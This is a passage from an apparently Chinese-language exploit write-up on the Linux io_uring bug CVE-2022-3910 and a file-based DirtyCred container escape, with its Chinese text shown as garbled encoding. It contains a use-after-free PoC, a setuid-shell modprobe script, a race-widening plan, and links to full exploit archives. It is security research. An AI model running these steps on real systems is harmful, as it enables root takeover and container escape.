class="hljs-comment">// free the file struct</span><br>	&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>æ‰€ä»¥æˆ‘ä»¬åªéœ€è¦é‡å¤è§¦å‘æ¼æ´ç›´åˆ°å¼•ç”¨è®¡æ•°é™è‡³0å°±å¯ä»¥é‡Šæ”¾å¯¹åº”çš„<code>file</code>ç»“æ„ä½“ï¼ŒåŒæ—¶<code>io_uring</code>ä¼šç»§ç»­ä¿ç•™å¯¹å…¶çš„å¼•ç”¨ï¼Œä»è€Œè¾¾æˆâ€‹ä¸€ä¸ªç»å…¸çš„<strong>UAF</strong>â€‹ã€‚</p><p>pocå¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">io_uring</span> <span class="hljs-title">r</span>;</span><br>io_uring_queue_init(<span class="hljs-number">8</span>, &amp;r, <span class="hljs-number">0</span>);<br><span class="hljs-type">int</span> target = open(TARGET_PATH, O_RDWR | O_CREAT | O_TRUNC, <span class="hljs-number">0644</span>);<br><br><span class="hljs-comment">// Register target file as fixed file.</span><br><span class="hljs-keyword">if</span> (io_uring_register_files(&amp;r, &amp;target, <span class="hljs-number">1</span>) &lt; <span class="hljs-number">0</span>) &#123;<br>	perror(<span class="hljs-string">&quot;[-] io_uring_register_files&quot;</span>);<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">io_uring_sqe</span> * <span class="hljs-title">sqe</span>;</span><br><br><span class="hljs-comment">// Refcount is currently 2</span><br><span class="hljs-comment">// (Check by by setting a breakpoint in io_msg_ring())</span><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">2</span>; i++) &#123;<br>	sqe = io_uring_get_sqe(&amp;r);<br>	io_uring_prep_msg_ring(sqe, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>	sqe-&gt;flags |= IOSQE_FIXED_FILE;<br>	io_uring_submit(&amp;r);<br>	io_uring_wait_cqe(&amp;r, &amp;cqe);<br>	io_uring_cqe_seen(&amp;r, cqe);<br>&#125;<br><br><span class="hljs-comment">// Refcount should now be 0, file struct should be freed.</span><br></code></pre></td></tr></table></figure><p>æ­£å¸¸çš„åˆ©ç”¨æ–¹å¼å¯ä»¥é€šè¿‡è·¨ç¼“å­˜å †å–·è¦†ç›–<code>sk_buff</code>çš„ææ„å‡½æ•°ï¼ˆä¸æ˜¯<code>sk_buff-&gt;data</code>ï¼Œå› ä¸ºå®ƒçš„æœ€å°åˆ†é…å¤ªå¤§äº†ï¼‰ä»¥è·å¾—æ‰§è¡Œæ§åˆ¶ï¼Œexpå¦‚ä¸‹ï¼š <a target="_blank" rel="noopener" href="https://starlabs.sg/blog/2023/07-container-escape-using-file-based-DirtyCred_old_source.zip">CVE-2022-3910.rar</a></p><h1 id="dirtycred">DirtyCred</h1><p>åœ¨æˆ‘ä¹‹å‰çš„ä¸€ç¯‡æ–‡ç« <a href="https://mundi-xu.github.io/2022/10/08/DirtyCred/">DirtyCredä¸CVE-2021-4154æ¼æ´åˆ†æ</a>ä¸­è¯¦ç»†ä»‹ç»äº†DirtyCredçš„åŸç†å’Œåˆ©ç”¨æ–¹å¼ï¼Œå…¶ä¸»è¦æ ¸å¿ƒæ€æƒ³å°±æ˜¯<strong>Attacking Open File Credentials</strong>.</p><h2 id="é¢ä¸´çš„å›°éš¾">é¢ä¸´çš„å›°éš¾</h2><p>ä¸€èˆ¬æ¥è¯´ï¼ŒDirtyCredçš„åˆ©ç”¨æ–¹å¼æ˜¯é€šè¿‡æ‰“å¼€<code>/etc/passwd</code>æ¥æ·»åŠ å…·æœ‰ root æƒé™çš„æ–°ç”¨æˆ·ï¼Œä½†æˆ‘ä»¬è¿™é‡Œå‡†å¤‡å°è¯•åˆ©ç”¨<a target="_blank" rel="noopener" href="https://lkmidas.github.io/posts/20210223-linux-kernel-pwn-modprobe/#the-overwriting-modprobe_path-technique"><code>/sbin/modprobe</code></a>ã€‚</p><p>å½“æˆ‘ä»¬å°è¯•æ‰§è¡Œå…·æœ‰æœªçŸ¥é­”æ•°ï¼ˆmagic headerï¼‰çš„æ–‡ä»¶æ—¶ï¼Œå†…æ ¸å°†<strong>ä»¥root æƒé™ä» root å‘½åç©ºé—´</strong>è°ƒç”¨å…¨å±€å†…æ ¸å˜é‡<code>modprobe_path</code>æŒ‡å‘çš„äºŒè¿›åˆ¶æ–‡ä»¶ï¼ˆé»˜è®¤ä¸º<code>/sbin/modprobe</code>ï¼‰ã€‚</p><p>æ‰€ä»¥æˆ‘ä»¬åªéœ€è¦æŠŠ<code>/sbin/modprobe</code>ç”¨ä»¥ä¸‹ shell è„šæœ¬è¦†ç›–ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/sh</span><br><span class="hljs-built_in">cp</span> /bin/sh /tmp/sh<br><span class="hljs-built_in">chmod</span> 4777 /tmp/sh<br></code></pre></td></tr></table></figure><p>å½“æˆ‘ä»¬å°è¯•æ‰§è¡Œå…·æœ‰æ— æ•ˆé­”æ•°å¤´çš„æ–‡ä»¶æ—¶ï¼Œå†…æ ¸å°±ä¼šæ‰§è¡Œä¸Šè¿°è„šæœ¬ï¼Œåˆ›å»º<code>/bin/sh</code> æ¥è·å–root shellã€‚</p><p>ä½†å®é™…ä¸Šè¿™ç§åˆ©ç”¨æ–¹å¼åœ¨å®¹å™¨åŒ–çš„ç¯å¢ƒä¸­æ— æ•ˆï¼Œå› ä¸ºåœ¨å®¹å™¨çš„å‘½åç©ºé—´ä¸­æ— æ³•ç›´æ¥è®¿é—®<code>/sbin/modprobe</code>ï¼Œ<code>modprobe_path</code>ä¼šè¢«å®šä½åˆ°<code>/proc/sys/kernel/modprobe</code>ã€‚</p><h2 id="procæ–‡ä»¶ç³»ç»Ÿ"><code>/proc</code>æ–‡ä»¶ç³»ç»Ÿ</h2><p>æ ¹æ®<a target="_blank" rel="noopener" href="https://docs.kernel.org/filesystems/proc.html">å®˜ç½‘æ–‡æ¡£</a>çš„å®šä¹‰ï¼Œ<code>/proc</code>ä½œä¸ºä¸€ä¸ªä¼ªæ–‡ä»¶ç³»ç»Ÿï¼Œè´Ÿè´£å……å½“å†…æ ¸ä¸­å†…éƒ¨æ•°æ®ç»“æ„çš„æ¥å£ï¼Œå¯ç”¨äºè·å–æœ‰å…³ç³»ç»Ÿçš„ä¿¡æ¯å¹¶åœ¨è¿è¡Œæ—¶æ›´æ”¹æŸäº›å†…æ ¸å‚æ•°ï¼ˆsysctlï¼‰ã€‚å…¶ä¸­<code>/proc/sys</code>å­ç›®å½•å…è®¸æˆ‘ä»¬é€šè¿‡å†™æ–‡ä»¶çš„æ–¹å¼ä¸€æ ·ä¿®æ”¹å„ç§å†…æ ¸å‚æ•°çš„å€¼ã€‚ä¾‹å¦‚<code>/proc/sys/kernel/modprobe</code>ä¼šç›´æ¥æŒ‡å‘å†…æ ¸å…¨å±€å˜é‡<code>modprobe_path</code>ï¼Œä¿®æ”¹è¯¥â€œæ–‡ä»¶â€å°†å¯¹åº”åœ°æ›´æ”¹<code>modprobe_path</code>çš„å€¼ã€‚</p><p>å½“ç„¶ï¼Œå¦‚æœæˆ‘ä»¬<a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v6.0-rc5/source/fs/proc/proc_sysctl.c#L582">ä¸æ˜¯ root</a>ï¼Œæˆ‘ä»¬å°±æ²¡åŠæ³•å‘<code>/proc/sys/*</code> ä¸­å†™å…¥ä»»ä½•å†…å®¹ã€‚ä½†è¿™å¹¶ä¸æ˜¯ä¸€ä¸ªå¤§é—®é¢˜ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨ä¼ ç»Ÿçš„DirtyCredå»å†™å…¥<code>/etc/passwd</code>æ¥å®ç°æœ¬åœ°æƒé™æå‡ã€‚</p><p>éœ€è¦æ³¨æ„çš„æ˜¯è¿™äº›å¯¹æ–‡ä»¶çš„æ“ä½œéœ€è¦ç‰¹å®šçš„å¤„ç†å‡½æ•°ï¼Œå…¶ä¸­<code>/proc/sys/*</code>ä¸<code>file</code>ç»“æ„ä½“ç›¸å…³è”çš„<code>f_op</code>ä¼šè¢«è®¾ç½®ä¸º<code>proc_sys_file_operations</code>ã€‚ä½†æ˜¯inodeåŠ é”ä¾èµ–äºå‡è®¾<code>ext4_buffered_write_iter()</code>å¯ä»¥æˆåŠŸå†™å…¥ç›®æ ‡æ–‡ä»¶ï¼Œè€Œå¯¹<code>/proc/sys/*</code>æ–‡ä»¶æ‰§è¡Œä¼šå¯¼è‡´æœªå®šä¹‰è¡Œä¸ºï¼Œè¿”å›é”™è¯¯ä»£ç ã€‚</p><p>è€Œä¸ºäº†æˆåŠŸåˆ©ç”¨DirtyCredï¼Œæˆ‘ä»¬å¿…é¡»åœ¨è°ƒç”¨å†™å…¥å¤„ç†ç¨‹åºä¹‹å‰æ›¿æ¢<code>file</code>ç»“æ„ä½“ï¼Œè¿™æ„å‘³ç€æœ‰å¦‚ä¸‹ç«äº‰çª—å£ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">ssize_t</span> <span class="hljs-title function_">vfs_write</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> file *file, <span class="hljs-type">const</span> <span class="hljs-type">char</span> __user *buf, <span class="hljs-type">size_t</span> count, <span class="hljs-type">loff_t</span> *pos)</span><br>&#123;<br>	<span class="hljs-type">ssize_t</span> ret;<br><br>	<span class="hljs-keyword">if</span> (!(file-&gt;f_mode &amp; FMODE_WRITE))<br>		<span class="hljs-keyword">return</span> -EBADF;<br>	<span class="hljs-keyword">if</span> (!(file-&gt;f_mode &amp; FMODE_CAN_WRITE))<br>		<span class="hljs-keyword">return</span> -EINVAL;<br>	<span class="hljs-comment">// RACE WINDOW START</span><br>	<span class="hljs-keyword">if</span> (unlikely(!access_ok(buf, count)))<br>		<span class="hljs-keyword">return</span> -EFAULT;<br><br>	ret = rw_verify_area(WRITE, file, pos, count);<br>	<span class="hljs-keyword">if</span> (ret)<br>		<span class="hljs-keyword">return</span> ret;<br>	<span class="hljs-keyword">if</span> (count &gt; MAX_RW_COUNT)<br>		count =  MAX_RW_COUNT;<br><br>	file_start_write(file);<br>	<span class="hljs-comment">// RACE WINDOW END</span><br>	<span class="hljs-keyword">if</span> (file-&gt;f_op-&gt;write)<br>		ret = file-&gt;f_op-&gt;write(file, buf, count, pos);<br>	<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (file-&gt;f_op-&gt;write_iter)<br>		ret = new_sync_write(file, buf, count, pos);<br>	<span class="hljs-keyword">else</span><br>		ret = -EINVAL;<br>	<span class="hljs-keyword">if</span> (ret &gt; <span class="hljs-number">0</span>) &#123;<br>		fsnotify_modify(file);<br>		add_wchar(current, ret);<br>	&#125;<br>	inc_syscw(current);<br>	file_end_write(file);<br>	<span class="hljs-keyword">return</span> ret;<br>&#125;<br></code></pre></td></tr></table></figure><p>å¯ä»¥çœ‹å‡ºæ¥çª—å£å¾ˆå°ï¼Œæˆ‘ä»¬éœ€è¦æƒ³åŠæ³•æ‰©å¤§çª—å£ã€‚</p><h2 id="a-new-target-aio_write">A new target: <code>aio_write()</code></h2><p><a target="_blank" rel="noopener" href="https://blog.cloudflare.com/io_submit-the-epoll-alternative-youve-never-heard-about/">å†…æ ¸ AIO å­ç³»ç»Ÿ</a>ï¼ˆä¸ POSIX AIO ä¸åŒï¼‰æ˜¯ä¸€ä¸ªæœ‰ç‚¹è¿‡æ—¶çš„å¼‚æ­¥ I/O æ¥å£ï¼Œæœ‰ç‚¹åƒ io_uring çš„å‰èº«ã€‚æˆ‘ä»¬å¯ä»¥å°è¯•åˆ©ç”¨å…¶ä¸­çš„<a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v6.0-rc5/source/fs/aio.c#L1568"><code>aio_write()</code></a>å‡½æ•°ï¼Œå¦‚æœæˆ‘ä»¬é€šè¿‡å†…æ ¸ AIO æ¥å£è¯·æ±‚å†™å…¥ç³»ç»Ÿè°ƒç”¨ï¼Œè¯¥å‡½æ•°å°±ä¼šè¢«è°ƒç”¨ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">aio_write</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> kiocb *req, <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> iocb *iocb,</span><br><span class="hljs-params">			 <span class="hljs-type">bool</span> vectored, <span class="hljs-type">bool</span> compat)</span><br>&#123;<br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">iovec</span> <span class="hljs-title">inline_vecs</span>[<span class="hljs-title">UIO_FASTIOV</span>], *<span class="hljs-title">iovec</span> =</span> inline_vecs;<br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">iov_iter</span> <span class="hljs-title">iter</span>;</span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file</span> *<span class="hljs-title">file</span>;</span><br>	<span class="hljs-type">int</span> ret;<br><br>	ret = aio_prep_rw(req, iocb);<br>	<span class="hljs-keyword">if</span> (ret)<br>		<span class="hljs-keyword">return</span> ret;<br>	file = req-&gt;ki_filp;<br><br>	<span class="hljs-keyword">if</span> (unlikely(!(file-&gt;f_mode &amp; FMODE_WRITE)))<br>		<span class="hljs-keyword">return</span> -EBADF;<br>	<span class="hljs-keyword">if</span> (unlikely(!file-&gt;f_op-&gt;write_iter))<br>		<span class="hljs-keyword">return</span> -EINVAL;<br><br>	ret = aio_setup_rw(WRITE, iocb, &amp;iovec, vectored, compat, &amp;iter);<br>	<span class="hljs-keyword">if</span> (ret &lt; <span class="hljs-number">0</span>)<br>		<span class="hljs-keyword">return</span> ret;<br>	ret = rw_verify_area(WRITE, file, &amp;req-&gt;ki_pos, iov_iter_count(&amp;iter));<br>	<span class="hljs-keyword">if</span> (!ret) &#123;<br>		<span class="hljs-comment">/*</span><br><span class="hljs-comment">		 * Open-code file_start_write here to grab freeze protection,</span><br><span class="hljs-comment">		 * which will be released by another thread in</span><br><span class="hljs-comment">		 * aio_complete_rw().  Fool lockdep by telling it the lock got</span><br><span class="hljs-comment">		 * released so that it doesn&#x27;t complain about the held lock when</span><br><span class="hljs-comment">		 * we return to userspace.</span><br><span class="hljs-comment">		 */</span><br>		<span class="hljs-keyword">if</span> (S_ISREG(file_inode(file)-&gt;i_mode)) &#123;<br>			sb_start_write(file_inode(file)-&gt;i_sb);<br>			__sb_writers_release(file_inode(file)-&gt;i_sb, SB_FREEZE_WRITE);<br>		&#125;<br>		req-&gt;ki_flags |= IOCB_WRITE;<br>		aio_rw_done(req, call_write_iter(file, req, &amp;iter));<br>	&#125;<br>	kfree(iovec);<br>	<span class="hljs-keyword">return</span> ret;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>aio_setup_rw()</code>ä¼šä½¿ç”¨<code>copy_from_user()</code>ä»ç”¨æˆ·æ€å¤åˆ¶<code>iovec</code>ï¼ŒåŒæ—¶å®ƒä½äºæˆ‘ä»¬çš„ç«äº‰çª—å£å†…ï¼ˆåœ¨æƒé™æ£€æŸ¥ä¹‹åï¼Œä½†åœ¨å†™å…¥ç¨‹åºå¤„ç†å®Œæˆä¹‹å‰ï¼‰ã€‚å› æ­¤ï¼Œå¦‚æœæˆ‘ä»¬æœ‰æƒè®¿é—®<a target="_blank" rel="noopener" href="https://blog.lizzie.io/using-userfaultfd.html">userfaultfd</a>æˆ–<a target="_blank" rel="noopener" href="https://exploiter.dev/blog/2022/FUSE-exploit.html">FUSE</a>ï¼Œæˆ‘ä»¬å°±å¯ä»¥ç¨³å®šçš„åˆ©ç”¨è¿™ä¸ªç«äº‰çª—å£ï¼Œä»è€Œå…è®¸æˆ‘ä»¬å°†å†™å…¥æ“ä½œé‡å®šå‘åˆ°<code>/proc/sys/kernel/modprobe</code>.</p><p>ä½†æ˜¯ä¸€èˆ¬æ¥è¯´ï¼Œä¸å¤ªä¼šæœ‰äºº<strong>åœ¨å®¹å™¨â€‹å†…</strong>å¯ç”¨ FUSE æˆ–ä¸º userfaultfd æ‰“å¼€å†…æ ¸é¡µé”™è¯¯å¤„ç†ã€‚æ‰€ä»¥çœ‹ä¸Šå»åˆ©ç”¨ä¸Šè¿°æŠ€æœ¯æ‰€éœ€çš„æ¡ä»¶è¿‡äºä¸¥æ ¼ï¼Œæ— æ³•åœ¨ä¸€èˆ¬çš„ç°å®ä¸–ç•Œåˆ©ç”¨åœºæ™¯ä¸­å‘æŒ¥ä½œç”¨ã€‚</p><blockquote><p>æ³¨æ„ï¼šä»æŠ€æœ¯è§’åº¦æ¥è¯´ï¼Œå³ä½¿ userfaultfd å†…æ ¸é¡µé”™è¯¯å¤„ç†è¢«ç¦ç”¨ï¼Œå¦‚æœæˆ‘ä»¬æœ‰<code>CAP_SYS_PTRACE</code>èƒ½åŠ›ï¼Œæˆ‘ä»¬ä»ç„¶å¯ä»¥ä½¿ç”¨å®ƒå®Œæˆåˆ©ç”¨ï¼ˆå®é™…æ£€æŸ¥åœ¨<a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v6.0-rc5/source/fs/userfaultfd.c#L2064">è¿™é‡Œ</a>ï¼‰ã€‚å½“ç„¶ï¼Œä¸€èˆ¬æ¥è¯´ï¼Œå³ä½¿æ‹¥æœ‰å®¹å™¨rootçš„æƒé™ï¼Œæˆ‘ä»¬ä¹Ÿä¸å¤ªå¯èƒ½è·å–è¿™ä¸ªèƒ½åŠ›â€¦â€¦.</p></blockquote><h2 id="slow-page-fault">Slow page fault</h2><p>è®©æˆ‘ä»¬å›è¿‡å¤´è€ƒè™‘ä¸€ä¸‹åˆ°ç›®å‰ä¸ºæ­¢ userfaultfd å’Œ FUSE åœ¨æˆ‘ä»¬çš„æ¼æ´åˆ©ç”¨è¿‡ç¨‹ä¸­æ‰€æ‰®æ¼”çš„è§’è‰²ã€‚å½“å†…æ ¸å°è¯•ä»ç”¨æˆ·ç©ºé—´å¤åˆ¶æ•°æ®å¹¶é‡åˆ°é¡µé”™è¯¯æ—¶ï¼š</p><ul><li>userfaultfd ä¼šå¯¼è‡´å‡ºé”™çš„å†…æ ¸çº¿ç¨‹æš‚åœï¼Œç›´åˆ°æˆ‘ä»¬å¤„ç†æ¥è‡ªç”¨æˆ·æ€çš„é¡µé”™è¯¯ã€‚</li><li>å½“å†…æ ¸å°è¯•å°†é”™è¯¯é¡µåŠ è½½åˆ°å†…å­˜ä¸­æ—¶ï¼Œå°†è°ƒç”¨æˆ‘ä»¬è‡ªå®šä¹‰çš„ FUSE è¯»å–å¤„ç†ç¨‹åºã€‚</li></ul><p>åœ¨è¿™ä¸¤ç§æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬éƒ½å¯ä»¥ç®€å•åœ°åœ¨<code>copy_from_user()</code>è°ƒç”¨å¤„æš‚åœå†…æ ¸çº¿ç¨‹ç›´åˆ°å®Œæˆå…¶ä»–äº‹æƒ…ï¼Œä¾‹å¦‚åˆ¶é€ å¯¹ç¢°ã€‚ä½†æ˜¯æ˜¯å¦æœ‰å¯èƒ½ä½¿é¡µé”™è¯¯èŠ±è´¹å¾ˆé•¿æ—¶é—´ï¼Œä»¥ä¾¿æˆ‘ä»¬å¯ä»¥åœ¨è¯¥æ—¶é—´çª—å£å†…å®Œæˆå †å–·ï¼Ÿ</p><p>gctf 2023ä¸­æå‡ºäº†<a target="_blank" rel="noopener" href="https://gist.github.com/pqlx/b1ed41e7557c042bcc7a8c74ea1feae8">åˆ©ç”¨æ–‡ä»¶æ‰“æ´ (Hole Punching)</a>æ¥æ˜¾ç€å¢åŠ é¡µé”™è¯¯é€ æˆçš„å»¶è¿Ÿï¼š</p><p><img lazyload src="/img/loading.gif" data-src="https://starlabs.sg/blog/2023/images/07-container-escape-using-file-based-DirtyCred_003.png"></p><p><a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v6.0-rc5/source/mm/shmem.c#L2061"><code>shmem_fault()</code></a>ä¸­çš„æ³¨é‡Šè§£é‡Šäº†ä¸ºä»€ä¹ˆä¼šå‡ºç°è¿™ç§æƒ…å†µï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Trinity finds that probing a hole which tmpfs is punching can</span><br><span class="hljs-comment"> * prevent the hole-punch from ever completing: which in turn</span><br><span class="hljs-comment"> * locks writers out with its hold on i_rwsem.  So refrain from</span><br><span class="hljs-comment"> * faulting pages into the hole while it&#x27;s being punched.  Although</span><br><span class="hljs-comment"> * shmem_undo_range() does remove the additions, it may be unable to</span><br><span class="hljs-comment"> * keep up, as each new page needs its own unmap_mapping_range() call,</span><br><span class="hljs-comment"> * and the i_mmap tree grows ever slower to scan if new vmas are added.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * It does not matter if we sometimes reach this check just before the</span><br><span class="hljs-comment"> * hole-punch begins, so that one fault then races with the punch:</span><br><span class="hljs-comment"> * we just need to make racing faults a rare case.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * The implementation below would be much simpler if we just used a</span><br><span class="hljs-comment"> * standard mutex or completion: but we cannot take i_rwsem in fault,</span><br><span class="hljs-comment"> * and bloating every shmem inode for this unlikely case would be sad.</span><br><span class="hljs-comment"> */</span><br></code></pre></td></tr></table></figure><h2 id="æœ€ç»ˆåˆ©ç”¨">æœ€ç»ˆåˆ©ç”¨</h2><p>ç»“åˆä¸Šè¿°ä¸¤ä¸ªæŠ€å·§ï¼Œæˆ‘ä»¬å¯ä»¥å¾—å‡ºæœ€ç»ˆçš„åˆ©ç”¨æ–¹å¼ï¼š</p><ol type="1"><li><p>å…ˆéšä¾¿æ‰“å¼€ä¸€äº›æ–‡ä»¶ï¼Œæ¯”å¦‚æ–‡ä»¶ Aï¼Œè®¾ç½®æƒé™ä¸º<code>O_RDWR</code>ã€‚å†…æ ¸ä¼šåˆ†é…ä¸€ä¸ªç›¸åº”çš„<code>file</code>ç»“æ„ä½“ã€‚</p></li><li><p>åˆ©ç”¨CVE-2022-3910åå¤å‡å°‘æ–‡ä»¶Aç»“æ„ä½“çš„å¼•ç”¨è®¡æ•°ï¼Œâ€‹<strong>ç›´åˆ°å…¶ä¸‹æº¢</strong>â€‹ã€‚è¿™ä¼šfreeç»“æ„ä½“ä½†åœ¨æ–‡ä»¶æè¿°ç¬¦è¡¨ä¸­ä»ç„¶ä¿ç•™å¯¹å®ƒçš„å¼•ç”¨ã€‚</p><blockquote><p><strong>æ³¨æ„</strong>ï¼šè¿™æ˜¯å¿…éœ€çš„ï¼Œå› ä¸º<code>fget()</code>ï¼ˆç¨åæˆ‘ä»¬æäº¤ AIO è¯·æ±‚æ—¶å°†è°ƒç”¨å®ƒï¼‰å¦‚æœåœ¨å¼•ç”¨è®¡æ•°ä¸º 0 çš„<code>file</code>ç»“æ„ä½“ä¸Šè°ƒç”¨å°†å¯¼è‡´å†…æ ¸åœæ­¢ã€‚ä»£ç åœ¨<a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v6.0-rc5/source/fs/file.c#L882">è¿™é‡Œ</a>ï¼ˆæ£€æŸ¥çš„å®æ˜¯<code>get_file_rcu</code>ï¼‰ã€‚</p></blockquote></li><li><p>ä½¿ç”¨<code>memfd_create()</code>åˆ›å»ºå¹¶è·å–ä¸´æ—¶æ–‡ä»¶ B çš„æ–‡ä»¶æè¿°ç¬¦ï¼Œå¹¶ä½¿ç”¨<code>fallocate()</code>ä¸ºå…¶åˆ†é…å¤§é‡å†…å­˜ã€‚</p></li><li><p>ä½¿ç”¨è·¨é¡µçš„ç¼“å†²åŒºå‡†å¤‡ AIO è¯·æ±‚ã€‚ç¬¬äºŒå—é¡µåº”è¯¥ç”±æ–‡ä»¶ B æ§åˆ¶ï¼Œå¹¶ä¸”å°šæœªåŠ è½½åœ¨å†…å­˜ä¸­ã€‚</p></li><li><p>ï¼ˆCPU 1ï¼Œçº¿ç¨‹Xï¼‰ï¼šä½¿ç”¨<code>FALLOC_FL_PUNCH_HOLE | FALLOC_FL_KEEP_SIZE</code>è°ƒç”¨<code>fallocate()</code>åŠ è½½æ–‡ä»¶ Bã€‚</p></li><li><p>ï¼ˆCPU 1ï¼Œçº¿ç¨‹Yï¼‰ï¼šæäº¤AIOè¯·æ±‚ã€‚è¿™ä¼šè§¦å‘æ–‡ä»¶ B æ‰€åœ¨é¡µçš„é¡µé”™è¯¯ã€‚å½“æ–‡ä»¶æ­£åœ¨æ‰“æ´æ—¶ï¼Œçº¿ç¨‹ Y ä¼šå°†<a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v6.0-rc5/source/mm/shmem.c#L2086">è‡ªå·±æ”¾å…¥ç­‰å¾…é˜Ÿåˆ—</a>ï¼Œåœæ­¢æ‰§è¡Œï¼Œç›´åˆ°çº¿ç¨‹ X å®Œæˆã€‚</p></li><li><p>ï¼ˆCPU 0ï¼Œçº¿ç¨‹ Zï¼‰ï¼šå½“çº¿ç¨‹ Y åœæ­¢æ—¶ï¼Œé‡å¤è°ƒç”¨<code>open()</code>æ‰“å¼€<code>/proc/sys/kernel/modprobe</code>æ¥è®©å¯¹åº”çš„<code>file</code>ç»“æ„ä½“è¦†ç›–æ‰æ–‡ä»¶Açš„ç»“æ„ä½“ã€‚</p></li><li><p>çº¿ç¨‹ Y æ¢å¤æ‰§è¡Œå¹¶åœ¨<code>/proc/sys/kernel/modprobe</code>ä¸Šæ‰§è¡Œå†™å…¥ã€‚</p></li></ol><p>å®Œæ•´çš„expå¦‚ä¸‹: <a target="_blank" rel="noopener" href="https://starlabs.sg/blog/2023/07-container-escape-using-file-based-DirtyCred_source.zip">container-escape-using-file-based-DirtyCred.rar</a></p><h1 id="å®é™…åˆ©ç”¨">å®é™…åˆ©ç”¨</h1><h2 id="æ ‡å‡†-docker-å®¹å™¨">æ ‡å‡† Docker å®¹å™¨</h2><p>Commandï¼š<code>sudo docker run -it --rm ubuntu bash</code></p><p>ä½†æ˜¯å®é™…ä¸Šæˆ‘ä»¬çš„expå¹¶æ²¡æœ‰èµ·ä½œç”¨ï¼Œç›¸åï¼Œä¼šæ”¶åˆ°<code>Permission denied</code>ã€‚å› ä¸ºåœ¨è°ƒç”¨<code>aio_setup_rw()</code>åï¼Œ<code>rw_verify_area()</code>ä¼šè°ƒç”¨å®‰å…¨é’©å­å‡½æ•°ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼ŒDocker å®¹å™¨åœ¨å—é™çš„ AppArmor é…ç½®æ–‡ä»¶ä¸‹è¿è¡Œï¼Œå› æ­¤é¢å¤–çš„æƒé™æ£€æŸ¥<a target="_blank" rel="noopener" 